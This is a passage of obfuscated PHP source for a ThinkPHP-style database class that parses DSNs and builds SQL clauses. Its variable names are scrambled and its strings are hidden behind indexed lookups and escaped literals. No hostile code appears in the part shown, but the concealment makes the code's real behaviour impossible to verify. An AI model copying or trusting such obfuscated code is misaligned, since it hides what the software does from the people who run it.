$í÷ğÆ¿² = parent::query($ÀÙóÆçü); CacheLock::fileUnLock($“šĞ§èò[13]); return $í÷ğÆ¿²; } public function execute($”ÉõêÒ£) { $”ïÛ¢ïƒ =& $_SERVER[¦»×‡Ãã]; if (!CacheLock::fileLock($”ïÛ¢ïƒ[13])) { return !1; } $³‚Ú£„ = parent::execute($”ÉõêÒ£); CacheLock::fileUnLock($”ïÛ¢ïƒ[13]); return $³‚Ú£„; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\x68\151\x6e\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\161" => "\x3d", "\156\x65\161" => "\74\x3e", "\147\x74" => "\76", "\x65\147\x74" => "\x3e\x3d", "\154\164" => "\74", "\x65\154\164" => "\74\x3d", "\156\x6f\x74\154\x69\153\145" => "\x4e\117\124\x20\114\x49\x4b\x45", "\x6c\x69\x6b\145" => "\114\111\113\105", "\x69\156" => "\111\116", "\x6e\x6f\164\x69\x6e" => "\116\117\x54\x20\x49\x4e", "\156\x6f\x74\40\151\156" => "\x4e\117\x54\x20\x49\116", "\142\145\164\167\145\x65\156" => "\102\105\x54\127\x45\105\x4e", "\156\x6f\164\142\145\x74\167\145\145\x6e" => "\116\x4f\x54\x20\102\105\124\127\x45\105\x4e", "\156\x6f\164\40\142\145\164\x77\x65\145\x6e" => "\116\x4f\x54\x20\102\x45\x54\x57\x45\105\116"); protected $selectSql = "\123\105\114\105\x43\124\45\104\111\123\124\x49\116\x43\124\x25\40\x25\x46\111\x45\114\x44\45\40\x46\122\x4f\x4d\40\45\124\101\x42\x4c\105\45\45\x4a\117\111\116\45\x25\x57\110\105\x52\105\x25\x25\x47\122\x4f\x55\120\45\45\110\101\x56\x49\x4e\x47\x25\45\117\122\x44\105\122\x25\45\114\x49\115\111\124\x25\x20\x25\x55\116\111\117\x4e\x25\x25\x43\117\x4d\115\x45\116\x54\x25"; protected $bind = array(); public static function getInstance() { $ğ³Ü­¸¸ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[¦»×‡Ãã][1038], $ğ³Ü­¸¸); } public function factory($ùŞ¿ÊÈÉ = '') { $Âí¦²ì× =& $_SERVER[¦»×‡Ãã]; $ùŞ¿ÊÈÉ = $this->parseConfig($ùŞ¿ÊÈÉ); if (empty($ùŞ¿ÊÈÉ[$Âí¦²ì×[1039]])) { think_exception(think_lang($Âí¦²ì×[1040])); } $this->dbType = ucwords(strtolower($ùŞ¿ÊÈÉ[$Âí¦²ì×[1039]])); $›¡ˆ¯©Í = $Âí¦²ì×[1041] . $this->dbType; if (class_exists($›¡ˆ¯©Í)) { $Á‘×·   = new $›¡ˆ¯©Í($ùŞ¿ÊÈÉ); if ($Âí¦²ì×[1042] != strtolower($ùŞ¿ÊÈÉ[$Âí¦²ì×[1039]])) { $Á‘×·  ->dbType = strtoupper($this->dbType); } else { $Á‘×·  ->dbType = $this->_getDsnType($ùŞ¿ÊÈÉ[$Âí¦²ì×[994]]); } } else { think_exception(think_lang($Âí¦²ì×[1043]) . $Âí¦²ì×[1044] . $›¡ˆ¯©Í); } return $Á‘×·  ; } public function __call($äšÃ¼è, $¦¦ïƒÚ) { if (method_exists($this, $äšÃ¼è)) { return call_user_func_array(array($this, $äšÃ¼è), $¦¦ïƒÚ); } } protected function _getDsnType($Àó·õæ) { $îà²Íú = explode($_SERVER[¦»×‡Ãã][4], $Àó·õæ); $­«©ıò = strtoupper(trim($îà²Íú[0])); return $­«©ıò; } private function parseConfig($½›ã€Õ° = '') { $â²Æ„ÄÉ =& $_SERVER[¦»×‡Ãã]; if (!empty($½›ã€Õ°) && is_string($½›ã€Õ°)) { $½›ã€Õ° = $this->parseDSN($½›ã€Õ°); } elseif (is_array($½›ã€Õ°)) { $½›ã€Õ° = array_change_key_case($½›ã€Õ°); $½›ã€Õ° = array($â²Æ„ÄÉ[1039] => $½›ã€Õ°[$â²Æ„ÄÉ[1045]], $â²Æ„ÄÉ[966] => $½›ã€Õ°[$â²Æ„ÄÉ[1046]], $â²Æ„ÄÉ[967] => $½›ã€Õ°[$â²Æ„ÄÉ[1047]], $â²Æ„ÄÉ[964] => $½›ã€Õ°[$â²Æ„ÄÉ[1048]], $â²Æ„ÄÉ[965] => $½›ã€Õ°[$â²Æ„ÄÉ[1049]], $â²Æ„ÄÉ[21] => $½›ã€Õ°[$â²Æ„ÄÉ[1050]], $â²Æ„ÄÉ[994] => $½›ã€Õ°[$â²Æ„ÄÉ[1051]], $â²Æ„ÄÉ[17] => isset($½›ã€Õ°[$â²Æ„ÄÉ[1052]]) ? $½›ã€Õ°[$â²Æ„ÄÉ[1052]] : array()); } elseif (empty($½›ã€Õ°)) { if (think_config($â²Æ„ÄÉ[1053]) && $â²Æ„ÄÉ[1042] != strtolower(think_config($â²Æ„ÄÉ[1054]))) { $½›ã€Õ° = $this->parseDSN(think_config($â²Æ„ÄÉ[1053])); } else { $½›ã€Õ° = array($â²Æ„ÄÉ[1039] => think_config($â²Æ„ÄÉ[1054]), $â²Æ„ÄÉ[966] => think_config($â²Æ„ÄÉ[1055]), $â²Æ„ÄÉ[967] => think_config($â²Æ„ÄÉ[1056]), $â²Æ„ÄÉ[964] => think_config($â²Æ„ÄÉ[1057]), $â²Æ„ÄÉ[965] => think_config($â²Æ„ÄÉ[1058]), $â²Æ„ÄÉ[21] => think_config($â²Æ„ÄÉ[323]), $â²Æ„ÄÉ[994] => think_config($â²Æ„ÄÉ[1053]), $â²Æ„ÄÉ[17] => think_config($â²Æ„ÄÉ[1059])); } } return $½›ã€Õ°; } protected function initConnect($š§¥¾ÉÅ = true) { if (1 == think_config($_SERVER[¦»×‡Ãã][22])) { $this->_linkID = $this->multiConnect($š§¥¾ÉÅ); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $£¬à§·Å => $‡ïØĞöÕ) { $this->_linkID = $‡ïØĞöÕ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($ïÉŞƒ  = false) { $ÂÉ‚æô =& $_SERVER[¦»×‡Ãã]; static $Ş—ü£¹Å = array(); static $å²çì¤Í = -1; if (empty($Ş—ü£¹Å)) { foreach ($this->config as $‰çÌİ®÷ => $ØÁŠšÊƒ) { $Ş—ü£¹Å[$‰çÌİ®÷] = explode($ÂÉ‚æô[50], $ØÁŠšÊƒ); } } if (think_config($ÂÉ‚æô[1060])) { if ($ïÉŞƒ  || think_config($ÂÉ‚æô[471]) === !0) { $Ş‘¯¬ş = floor(mt_rand(0, think_config($ÂÉ‚æô[1061]) - 1)); $å²çì¤Í = $Ş‘¯¬ş; } else { if (is_numeric(think_config($ÂÉ‚æô[1062]))) { $Ş‘¯¬ş = think_config($ÂÉ‚æô[1062]); } else { $Ş‘¯¬ş = floor(mt_rand(think_config($ÂÉ‚æô[1061]), count($Ş—ü£¹Å[$ÂÉ‚æô[964]]) - 1)); } } } else { $Ş‘¯¬ş = floor(mt_rand(0, count($Ş—ü£¹Å[$ÂÉ‚æô[964]]) - 1)); $å²çì¤Í = $Ş‘¯¬ş; } $Ş‘¯¬ş = $å²çì¤Í !== -1 ? $å²çì¤Í : $Ş‘¯¬ş; $À’ó€’ = array($ÂÉ‚æô[966] => isset($Ş—ü£¹Å[$ÂÉ‚æô[966]][$Ş‘¯¬ş]) ? $Ş—ü£¹Å[$ÂÉ‚æô[966]][$Ş‘¯¬ş] : $Ş—ü£¹Å[$ÂÉ‚æô[966]][0], $ÂÉ‚æô[967] => isset($Ş—ü£¹Å[$ÂÉ‚æô[967]][$Ş‘¯¬ş]) ? $Ş—ü£¹Å[$ÂÉ‚æô[967]][$Ş‘¯¬ş] : $Ş—ü£¹Å[$ÂÉ‚æô[967]][0], $ÂÉ‚æô[964] => isset($Ş—ü£¹Å[$ÂÉ‚æô[964]][$Ş‘¯¬ş]) ? $Ş—ü£¹Å[$ÂÉ‚æô[964]][$Ş‘¯¬ş] : $Ş—ü£¹Å[$ÂÉ‚æô[964]][0], $ÂÉ‚æô[965] => isset($Ş—ü£¹Å[$ÂÉ‚æô[965]][$Ş‘¯¬ş]) ? $Ş—ü£¹Å[$ÂÉ‚æô[965]][$Ş‘¯¬ş] : $Ş—ü£¹Å[$ÂÉ‚æô[965]][0], $ÂÉ‚æô[21] => isset($Ş—ü£¹Å[$ÂÉ‚æô[21]][$Ş‘¯¬ş]) ? $Ş—ü£¹Å[$ÂÉ‚æô[21]][$Ş‘¯¬ş] : $Ş—ü£¹Å[$ÂÉ‚æô[21]][0], $ÂÉ‚æô[994] => isset($Ş—ü£¹Å[$ÂÉ‚æô[994]][$Ş‘¯¬ş]) ? $Ş—ü£¹Å[$ÂÉ‚æô[994]][$Ş‘¯¬ş] : $Ş—ü£¹Å[$ÂÉ‚æô[994]][0], $ÂÉ‚æô[17] => isset($Ş—ü£¹Å[$ÂÉ‚æô[17]][$Ş‘¯¬ş]) ? $Ş—ü£¹Å[$ÂÉ‚æô[17]][$Ş‘¯¬ş] : $Ş—ü£¹Å[$ÂÉ‚æô[17]][0]); return $this->connect($À’ó€’, $Ş‘¯¬ş); } public function parseDSN($‡‚ú÷Ê‘) { $£êªÅˆµ =& $_SERVER[¦»×‡Ãã]; if (empty($‡‚ú÷Ê‘)) { return !1; } $«…âœÎ• = parse_url($‡‚ú÷Ê‘); if ($«…âœÎ•[$£êªÅˆµ[207]]) { $·‰üúÜğ = array($£êªÅˆµ[1039] => $«…âœÎ•[$£êªÅˆµ[207]], $£êªÅˆµ[966] => isset($«…âœÎ•[$£êªÅˆµ[662]]) ? $«…âœÎ•[$£êªÅˆµ[662]] : $£êªÅˆµ[12], $£êªÅˆµ[967] => isset($«…âœÎ•[$£êªÅˆµ[1063]]) ? $«…âœÎ•[$£êªÅˆµ[1063]] : $£êªÅˆµ[12], $£êªÅˆµ[964] => isset($«…âœÎ•[$£êªÅˆµ[208]]) ? $«…âœÎ•[$£êªÅˆµ[208]] : $£êªÅˆµ[12], $£êªÅˆµ[965] => isset($«…âœÎ•[$£êªÅˆµ[209]]) ? $«…âœÎ•[$£êªÅˆµ[209]] : $£êªÅˆµ[12], $£êªÅˆµ[21] => isset($«…âœÎ•[$£êªÅˆµ[87]]) ? substr($«…âœÎ•[$£êªÅˆµ[87]], 1) : $£êªÅˆµ[12]); } else { preg_match($£êªÅˆµ[1064], trim($‡‚ú÷Ê‘), $—Ò‰ÅÚí); $·‰üúÜğ = array($£êªÅˆµ[1039] => $—Ò‰ÅÚí[1], $£êªÅˆµ[966] => $—Ò‰ÅÚí[2], $£êªÅˆµ[967] => $—Ò‰ÅÚí[3], $£êªÅˆµ[964] => $—Ò‰ÅÚí[4], $£êªÅˆµ[965] => $—Ò‰ÅÚí[5], $£êªÅˆµ[21] => $—Ò‰ÅÚí[6]); } $·‰üúÜğ[$£êªÅˆµ[994]] = $£êªÅˆµ[12]; return $·‰üúÜğ; } protected function debug() { $ÎĞè‚»æ =& $_SERVER[¦»×‡Ãã]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $ÎĞè‚»æ[1065]; if (think_config($ÎĞè‚»æ[1066])) { think_status($ÎĞè‚»æ[1067]); think_trace($this->queryStr . $ÎĞè‚»æ[1068] . think_status($ÎĞè‚»æ[24], $ÎĞè‚»æ[1067], 6) . $ÎĞè‚»æ[1069], $ÎĞè‚»æ[12], $ÎĞè‚»æ[1070]); } } protected function parseLock($ı–Ø—æÂ = false) { $ÔŸëƒ„ =& $_SERVER[¦»×‡Ãã]; if (!$ı–Ø—æÂ) { return $ÔŸëƒ„[12]; } if ($ÔŸëƒ„[996] == $this->dbType) { return $ÔŸëƒ„[1071]; } return $ÔŸëƒ„[1072]; } protected function parseSet($õ•ËŸı) { $Ë«Ö¡íÙ =& $_SERVER[¦»×‡Ãã]; foreach ($õ•ËŸı as $úÆø°Ôó => $½ëêˆœ) { if (is_array($½ëêˆœ) && $Ë«Ö¡íÙ[373] == $½ëêˆœ[0]) { $×ëéíò[] = $this->parseKey($úÆø°Ôó) . $Ë«Ö¡íÙ[962] . $½ëêˆœ[1]; } elseif (is_scalar($½ëêˆœ) || is_null($½ëêˆœ)) { $×ëéíò[] = $this->parseKey($úÆø°Ôó) . $Ë«Ö¡íÙ[962] . $this->parseValue($½ëêˆœ); } } return $Ë«Ö¡íÙ[1073] . implode($Ë«Ö¡íÙ[50], $×ëéíò); } protected function bindParam($ÔôÎ¢•ş, $Â’) { $this->bind[$_SERVER[¦»×‡Ãã][4] . $ÔôÎ¢•ş] = $Â’; } protected function parseBind($‡ ìã„) { $‡ ìã„ = array_merge($this->bind, $‡ ìã„); $this->bind = array(); return $‡ ìã„; } function parseKey(&$óƒŸûéï, $¯Ë“¾€İ = true) { if ($¯Ë“¾€İ) { $óƒŸûéï = $this->parseKeyCheck($óƒŸûéï); } return $óƒŸûéï; } function parseKeyCheck($öÄŸ Ù”) { $©ùÆÃå™ =& $_SERVER[¦»×‡Ãã]; $öÄŸ Ù” = trim($öÄŸ Ù”); if (!preg_match($©ùÆÃå™[1074], $öÄŸ Ù”)) { think_exception($©ùÆÃå™[1075] . $öÄŸ Ù”); } return $öÄŸ Ù”; } protected function parseValue($¡Ä·â‘ê) { $šî¨õàÉ =& $_SERVER[¦»×‡Ãã]; if (is_string($¡Ä·â‘ê)) { $¡Ä·â‘ê = $šî¨õàÉ[1035] . $this->escapeString($¡Ä·â‘ê) . $šî¨õàÉ[1035]; } elseif (isset($¡Ä·â‘ê[0]) && is_string($¡Ä·â‘ê[0]) && strtolower($¡Ä·â‘ê[0]) == $šî¨õàÉ[373]) { $¡Ä·â‘ê = $this->escapeString($¡Ä·â‘ê[1]); } elseif (is_array($¡Ä·â‘ê)) { $¡Ä·â‘ê = array_map(array($this, $šî¨õàÉ[1036]), $¡Ä·â‘ê); } elseif (is_bool($¡Ä·â‘ê)) { $¡Ä·â‘ê = $¡Ä·â‘ê ? $šî¨õàÉ[91] : $šî¨õàÉ[228]; } elseif (is_null($¡Ä·â‘ê)) { $¡Ä·â‘ê = $šî¨õàÉ[106]; } return $¡Ä·â‘ê; } protected function parseField($ûÆŞ°×¶) { $øŞèÜóè =& $_SERVER[¦»×‡Ãã]; if (is_string($ûÆŞ°×¶) && strpos($ûÆŞ°×¶, $øŞèÜóè[50])) { $ûÆŞ°×¶ = explode($øŞèÜóè[50], $ûÆŞ°×¶); } if (is_array($ûÆŞ°×¶)) { $æ‰é–Í = array(); foreach ($ûÆŞ°×¶ as $å¢“‡­¨ => $„®§›Ë) { if (!is_numeric($å¢“‡­¨)) { $æ‰é–Í[] = $this->parseKey($å¢“‡­¨, !1) . $øŞèÜóè[1076] . $this->parseKey($„®§›Ë); } else { $æ‰é–Í[] = $this->parseKey($„®§›Ë); } } $ƒ¢²ºåú = implode($øŞèÜóè[50], $æ‰é–Í); } elseif (is_string($ûÆŞ°×¶) && !empty($ûÆŞ°×¶)) { $ƒ¢²ºåú = $ûÆŞ°×¶; } else { $ƒ¢²ºåú = $øŞèÜóè[220]; } return $ƒ¢²ºåú; } protected function parseTable($íÑÛºÚ) { $àÓš¤¥œ =& $_SERVER[¦»×‡Ãã]; if (is_array($íÑÛºÚ)) { $ïÒ™ÄİĞ = array(); foreach ($íÑÛºÚ as $‡Ö—ûì÷ => $’ë—»Ğ) { if (!is_numeric($‡Ö—ûì÷)) { $ïÒ™ÄİĞ[] = $this->parseKey($‡Ö—ûì÷) . $àÓš¤¥œ[53] . $this->parseKey($’ë—»Ğ); } else { $ïÒ™ÄİĞ[] = $this->parseKey($‡Ö—ûì÷); } } $íÑÛºÚ = $ïÒ™ÄİĞ; } elseif (is_string($íÑÛºÚ)) { if (strstr($íÑÛºÚ, $àÓš¤¥œ[53])) { return $íÑÛºÚ; } $íÑÛºÚ = explode($àÓš¤¥œ[50], $íÑÛºÚ); array_walk($íÑÛºÚ, array($this, $àÓš¤¥œ[984])); } return $àÓš¤¥œ[978] . trim(implode($àÓš¤¥œ[1077], $íÑÛºÚ), $àÓš¤¥œ[461]) . $àÓš¤¥œ[978]; } protected function parseWhere($¹¬ªÃß) { $àéÙã…Ÿ =& $_SERVER[¦»×‡Ãã]; $İ¤ÖÄ¡ = $àéÙã…Ÿ[12]; if (is_string($¹¬ªÃß)) { $İ¤ÖÄ¡ = $¹¬ªÃß; } else { $õ‘úúÑ = isset($¹¬ªÃß[$àéÙã…Ÿ[1078]]) ? strtoupper($¹¬ªÃß[$àéÙã…Ÿ[1078]]) : $àéÙã…Ÿ[12]; if (in_array($õ‘úúÑ, array($àéÙã…Ÿ[1079], $àéÙã…Ÿ[1080], $àéÙã…Ÿ[1081]))) { $õ‘úúÑ = $àéÙã…Ÿ[53] . $õ‘úúÑ . $àéÙã…Ÿ[53]; unset($¹¬ªÃß[$àéÙã…Ÿ[1078]]); } else { $õ‘úúÑ = $àéÙã…Ÿ[1082]; } foreach ($¹¬ªÃß as $ÁÄ½Ì¢ => $¯ Úˆ¹Õ) { $İ¤ÖÄ¡ .= $àéÙã…Ÿ[354]; if (is_numeric($ÁÄ½Ì¢)) { $ÁÄ½Ì¢ = $àéÙã…Ÿ[1083]; } if (0 === strpos($ÁÄ½Ì¢, $àéÙã…Ÿ[11])) { $İ¤ÖÄ¡ .= $this->parseThinkWhere($ÁÄ½Ì¢, $¯ Úˆ¹Õ); } else { if (!preg_match($àéÙã…Ÿ[1084], trim($ÁÄ½Ì¢))) { think_exception(think_lang($àéÙã…Ÿ[1085]) . $àéÙã…Ÿ[4] . $ÁÄ½Ì¢); } $‡Ó…”ªµ = is_array($¯ Úˆ¹Õ) && isset($¯ Úˆ¹Õ[$àéÙã…Ÿ[1086]]); $ÁÄ½Ì¢ = trim($ÁÄ½Ì¢); if (strpos($ÁÄ½Ì¢, $àéÙã…Ÿ[214])) { $´òçÃªé = explode($àéÙã…Ÿ[214], $ÁÄ½Ì¢); $€–ÁùŞù = array(); foreach ($´òçÃªé as $ò‚«‚õš => $ƒÒÒ˜Ô’) { $ÆŸ›Øı“ = $‡Ó…”ªµ ? $¯ Úˆ¹Õ[$ò‚«‚õš] : $¯ Úˆ¹Õ; $€–ÁùŞù[] = $àéÙã…Ÿ[337] . $this->parseWhereItem($this->parseKey($ƒÒÒ˜Ô’), $ÆŸ›Øı“) . $àéÙã…Ÿ[983]; } $İ¤ÖÄ¡ .= implode($àéÙã…Ÿ[1087], $€–ÁùŞù); } elseif (strpos($ÁÄ½Ì¢, $àéÙã…Ÿ[360])) { $´òçÃªé = explode($àéÙã…Ÿ[360], $ÁÄ½Ì¢); $€–ÁùŞù = array(); foreach ($´òçÃªé as $ò‚«‚õš => $ƒÒÒ˜Ô’) { $ÆŸ›Øı“ = $‡Ó…”ªµ ? $¯ Úˆ¹Õ[$ò‚«‚õš] : $¯ Úˆ¹Õ; $€–ÁùŞù[] = $àéÙã…Ÿ[337] . $this->parseWhereItem($this->parseKey($ƒÒÒ˜Ô’), $ÆŸ›Øı“) . $àéÙã…Ÿ[983]; } $İ¤ÖÄ¡ .= implode($àéÙã…Ÿ[1082], $€–ÁùŞù); } else { $İ¤ÖÄ¡ .= $this->parseWhereItem($this->parseKey($ÁÄ½Ì¢), $¯ Úˆ¹Õ); } } $İ¤ÖÄ¡ .= $àéÙã…Ÿ[355] . $õ‘úúÑ; } $İ¤ÖÄ¡ = substr($İ¤ÖÄ¡, 0, -strlen($õ‘úúÑ)); } return empty($İ¤ÖÄ¡) ? $àéÙã…Ÿ[12] : $àéÙã…Ÿ[1088] . $İ¤ÖÄ¡; } protected function parseWhereItem($ßÄ Í«î, $‹—ÚıÃî) { $éÂ›¶ô =& $_SERVER[¦»×‡Ãã]; $¿óõ·§ = $éÂ›¶ô[12]; if (is_array($‹—ÚıÃî)) { if (is_string($‹—ÚıÃî[0])) { $¿²äûúÉ = strtolower($‹—ÚıÃî[0]); if (in_array($‹—ÚıÃî[0], array($éÂ›¶ô[962], $éÂ›¶ô[1089], $éÂ›¶ô[1090], $éÂ›¶ô[1091], $éÂ›¶ô[1092], $éÂ›¶ô[1093]))) { $¿óõ·§ .= $ßÄ Í«î . $éÂ›¶ô[53] . $‹—ÚıÃî[0] . $éÂ›¶ô[53] . $this->parseValue($‹—ÚıÃî[1]); } elseif (preg_match($éÂ›¶ô[1094], $‹—ÚıÃî[0])) { $¿óõ·§ .= $ßÄ Í«î . $éÂ›¶ô[53] . $this->exp[$¿²äûúÉ] . $éÂ›¶ô[53] . $this->parseValue($‹—ÚıÃî[1]); } elseif (preg_match($éÂ›¶ô[1095], $‹—ÚıÃî[0])) { if (is_array($‹—ÚıÃî[1])) { $•ôÙıŸÈ = isset($‹—ÚıÃî[2]) ? strtoupper($‹—ÚıÃî[2]) : $éÂ›¶ô[1080]; if (in_array($•ôÙıŸÈ, array($éÂ›¶ô[1079], $éÂ›¶ô[1080], $éÂ›¶ô[1081]))) { $ª˜ßÎñ” = array(); foreach ($‹—ÚıÃî[1] as $Ä™ñ”»„) { $ª˜ßÎñ”[] = $ßÄ Í«î . $éÂ›¶ô[53] . $this->exp[$¿²äûúÉ] . $éÂ›¶ô[53] . $this->parseValue($Ä™ñ”»„); } $¿óõ·§ .= $éÂ›¶ô[337] . implode($éÂ›¶ô[53] . $•ôÙıŸÈ . $éÂ›¶ô[53], $ª˜ßÎñ”) . $éÂ›¶ô[983]; } } else { $¿óõ·§ .= $ßÄ Í«î . $éÂ›¶ô[53] . $this->exp[$¿²äûúÉ] . $éÂ›¶ô[53] . $this->parseValue($‹—ÚıÃî[1]); } } elseif ($éÂ›¶ô[373] == $¿²äûúÉ) { $¿óõ·§ .= $éÂ›¶ô[981] . $ßÄ Í«î . $éÂ›¶ô[53] . $‹—ÚıÃî[1] . $éÂ›¶ô[1096]; } elseif (preg_match($éÂ›¶ô[1097], $‹—ÚıÃî[0])) { $¿óõ·§ .= $‹—ÚıÃî[0]; } elseif (preg_match($éÂ›¶ô[1098], $‹—ÚıÃî[0])) { if (isset($‹—ÚıÃî[2]) && $éÂ›¶ô[373] == $‹—ÚıÃî[2]) { $¿óõ·§ .= $ßÄ Í«î . $éÂ›¶ô[53] . $this->exp[$¿²äûúÉ] . $éÂ›¶ô[53] . $‹—ÚıÃî[1]; } else { if (is_string($‹—ÚıÃî[1])) { $‹—ÚıÃî[1] = explode($éÂ›¶ô[50], $‹—ÚıÃî[1]); } $ˆË½™‰  = implode($éÂ›¶ô[50], $this->parseValue($‹—ÚıÃî[1])); $¿óõ·§ .= $ßÄ Í«î . $éÂ›¶ô[53] . $this->exp[$¿²äûúÉ] . $éÂ›¶ô[981] . $ˆË½™‰  . $éÂ›¶ô[983]; } } elseif (preg_match($éÂ›¶ô[1099], $‹—ÚıÃî[0])) { $÷ƒœ¸ìú = is_string($‹—ÚıÃî[1]) ? explode($éÂ›¶ô[50], $‹—ÚıÃî[1]) : $‹—ÚıÃî[1]; $¿óõ·§ .= $éÂ›¶ô[981] . $ßÄ Í«î . $éÂ›¶ô[53] . $this->exp[$¿²äûúÉ] . $éÂ›¶ô[53] . $this->parseValue($÷ƒœ¸ìú[0]) . $éÂ›¶ô[1082] . $this->parseValue($÷ƒœ¸ìú[1]) . $éÂ›¶ô[355]; } else { think_exception(think_lang($éÂ›¶ô[1085]) . $éÂ›¶ô[4] . $‹—ÚıÃî[0]); } } else { $œà¼Öş‘ = count($‹—ÚıÃî); $Á•ïòÔ® = $éÂ›¶ô[12]; if (is_string($‹—ÚıÃî[$œà¼Öş‘ - 1])) { $Á•ïòÔ® = isset($‹—ÚıÃî[$œà¼Öş‘ - 1]) ? strtoupper($‹—ÚıÃî[$œà¼Öş‘ - 1]) : $éÂ›¶ô[12]; if (in_array($Á•ïòÔ®, array($éÂ›¶ô[1079], $éÂ›¶ô[1080], $éÂ›¶ô[1081]))) { $œà¼Öş‘ = $œà¼Öş‘ - 1; } } else { $Á•ïòÔ® = $éÂ›¶ô[1079]; } for ($°ÙŞ“ıœ = 0; $°ÙŞ“ıœ < $œà¼Öş‘; $°ÙŞ“ıœ++) { $÷ƒœ¸ìú = is_array($‹—ÚıÃî[$°ÙŞ“ıœ]) ? $‹—ÚıÃî[$°ÙŞ“ıœ][1] : $‹—ÚıÃî[$°ÙŞ“ıœ]; if ($éÂ›¶ô[373] == strtolower($‹—ÚıÃî[$°ÙŞ“ıœ][0])) { $¿óõ·§ .= $éÂ›¶ô[337] . $ßÄ Í«î . $éÂ›¶ô[53] . $÷ƒœ¸ìú . $éÂ›¶ô[1096] . $Á•ïòÔ® . $éÂ›¶ô[53]; } else { $ÉúÆˆ¦ = is_array($‹—ÚıÃî[$°ÙŞ“ıœ]) ? $this->exp[strtolower($‹—ÚıÃî[$°ÙŞ“ıœ][0])] : $éÂ›¶ô[962]; if (!$ÉúÆˆ¦ && is_array($‹—ÚıÃî[$°ÙŞ“ıœ]) && in_array($‹—ÚıÃî[$°ÙŞ“ıœ][0], array($éÂ›¶ô[962], $éÂ›¶ô[1089], $éÂ›¶ô[1090], $éÂ›¶ô[1091], $éÂ›¶ô[1092], $éÂ›¶ô[1093]))) { $ÉúÆˆ¦ = $‹—ÚıÃî[$°ÙŞ“ıœ][0]; } $¿óõ·§ .= $éÂ›¶ô[337] . $ßÄ Í«î . $éÂ›¶ô[53] . $ÉúÆˆ¦ . $éÂ›¶ô[53] . $this->parseValue($÷ƒœ¸ìú) . $éÂ›¶ô[1096] . $Á•ïòÔ® . $éÂ›¶ô[53]; } } $¿óõ·§ = substr($¿óõ·§, 0, -4); } } else { $¿óõ·§ .= $ßÄ Í«î . $éÂ›¶ô[1100] . $this->parseValue($‹—ÚıÃî); } return $¿óõ·§; } protected function parseThinkWhere($áÆ„ç‹˜, $ÏÜÓ¿şî) { $”å˜Æ•Î =& $_SERVER[¦»×‡Ãã]; $·ºğ‘Ô = $”å˜Æ•Î[12]; switch ($áÆ„ç‹˜) { case $”å˜Æ•Î[428]: $·ºğ‘Ô = $ÏÜÓ¿şî; break; case $”å˜Æ•Î[1083]: $·ºğ‘Ô = is_string($ÏÜÓ¿şî) ? $ÏÜÓ¿şî : substr($this->parseWhere($ÏÜÓ¿şî), 6); break; case $”å˜Æ•Î[1101]: parse_str($ÏÜÓ¿şî, $Âûë÷ ô); if (isset($Âûë÷ ô[$”å˜Æ•Î[1078]])) { $¸”ìÔƒ = $”å˜Æ•Î[53] . strtoupper($Âûë÷ ô[$”å˜Æ•Î[1078]]) . $”å˜Æ•Î[53]; unset($Âûë÷ ô[$”å˜Æ•Î[1078]]); } else { $¸”ìÔƒ = $”å˜Æ•Î[1082]; } $£ÎüŸÎû = array(); foreach ($Âûë÷ ô as $İŸœ¿Ô => $Ş•İû¯²) { $£ÎüŸÎû[] = $this->parseKey($İŸœ¿Ô) . $”å˜Æ•Î[1100] . $this->parseValue($Ş•İû¯²); } $·ºğ‘Ô = implode($¸”ìÔƒ, $£ÎüŸÎû); break; } return $·ºğ‘Ô; } protected function parseLimit($„Õí³°) { $—€®¶Ñ =& $_SERVER[¦»×‡Ãã]; return !empty($„Õí³°) ? $—€®¶Ñ[51] . $„Õí³° . $—€®¶Ñ[53] : $—€®¶Ñ[12]; } protected function parseJoin($şĞÒÇƒğ) { $ÚŸÏ¤«ı =& $_SERVER[¦»×‡Ãã]; $ßß½¼‰ú = $ÚŸÏ¤«ı[12]; if (!empty($şĞÒÇƒğ)) { if (is_array($şĞÒÇƒğ)) { foreach ($şĞÒÇƒğ as $éù„Ñ„ => $¶â¹Ø) { if (!1 !== stripos($¶â¹Ø, $ÚŸÏ¤«ı[1102])) { $ßß½¼‰ú .= $ÚŸÏ¤«ı[53] . $¶â¹Ø; } else { $ßß½¼‰ú .= $ÚŸÏ¤«ı[1103] . $¶â¹Ø; } } } else { $ßß½¼‰ú .= $ÚŸÏ¤«ı[1103] . $şĞÒÇƒğ; } } $ßß½¼‰ú = preg_replace($ÚŸÏ¤«ı[1104], think_config($ÚŸÏ¤«ı[1008]) . $ÚŸÏ¤«ı[1105], $ßß½¼‰ú); return $ßß½¼‰ú; } protected function parseOrder($š×÷ª²í) { $Õó›İ§ş =& $_SERVER[¦»×‡Ãã]; if (is_array($š×÷ª²í)) { $ôØÃ¯ã = array(); foreach ($š×÷ª²í as $ÓÏ¦™’é => $Ø³ €‘Ï) { if (is_numeric($ÓÏ¦™’é)) { $ôØÃ¯ã[] = $this->parseKey($Ø³ €‘Ï); } else { $Ø³ €‘Ï = in_array(strtoupper(trim($Ø³ €‘Ï)), array($Õó›İ§ş[1106], $Õó›İ§ş[1107])) ? $Õó›İ§ş[53] . $Ø³ €‘Ï : $Õó›İ§ş[12]; if (preg_match($Õó›İ§ş[1108], $ÓÏ¦™’é)) { $ôØÃ¯ã[] = $this->parseKey($ÓÏ¦™’é) . $Ø³ €‘Ï; } else { think_exception($Õó›İ§ş[1109] . $ÓÏ¦™’é); } } } $š×÷ª²í = implode($Õó›İ§ş[50], $ôØÃ¯ã); } return !empty($š×÷ª²í) ? $Õó›İ§ş[1110] . $š×÷ª²í : $Õó›İ§ş[12]; } protected function parseGroup($œò½ççš) { $ÁÏ¢á—† =& $_SERVER[¦»×‡Ãã]; return !empty($œò½ççš) ? $ÁÏ¢á—†[1111] . $œò½ççš : $ÁÏ¢á—†[12]; } protected function parseHaving($·³—û©) { $‰Ùû£¯ =& 